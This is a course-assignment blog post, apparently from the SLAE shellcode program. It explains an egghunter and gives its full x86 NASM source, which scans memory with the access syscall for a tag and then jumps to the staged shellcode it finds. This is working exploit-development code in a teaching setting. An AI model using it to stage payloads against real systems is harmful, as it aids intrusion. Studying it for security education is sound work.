---
title:  Assignment 3
description: Create an Egghunter
order: 3
---

[&lt;&lt; Go Back]({{ site.baseurl }})


# {{ page.title }}
### {{ page.description }}
___
<div style="text-align:right;direction:ltr;margin-left:1em;"><h6>{{ page.date }}</h6></div>

An egghunter is simply a small piece of shellcode that looks for other shellcode, mostly used when severly limited in space.  The shellcode we will be building has a loop with two parts:
 - Find an accessible page of memory
 - Increment through each byte looking for a *tag*
 
 In our case, we'll use SLAESLAE as our *tag*, or `\x53\x4c\x41\x45\x53\x4c\x41\x45`.  Let's have a look at the shellcode:
 
 ```nasm
; egghunter.nasm
;  - Search memory for tag, then pass over execution

global _start

section .text
_start:

        ; int access(const char *pathname, int mode)
        ; eax = 0x21 (access)
        ; ebx = [edx +4]
        ; ecx = 0x0

page:
        or dx, 0xfff            ; increment page

search:
        inc edx                 ; increment
        xor eax, eax
        mov al, 0x21            ; access, 33
        lea ebx, [edx +4]       ; pathname
        xor ecx, ecx            ; mode
        int 0x80                ; execute

        cmp al, 0xf2
        je page                 ; is accessible?

        mov eax, 0x45414c53     ; tag, SLAE
        mov edi, edx
        scasd                   ; compare to tag
        jne search
        scasd                   ; compare to tag
        jne search

        jmp edi                 ; found!
 ```

To check for memory access, we used the **access** function.  This allows us to search large spaces in memory without worrying about triggering an exception.  We then proceed to increment our pointer until the *tag* SLAE is found twice in a row, at which time we *jmp* to the newly found shellcode.

You can find the all the code to this challenge at [https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_3](https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_3).

<br>
{% include preamble.md %}

[&lt;&lt; Go Back]({{ site.baseurl }})
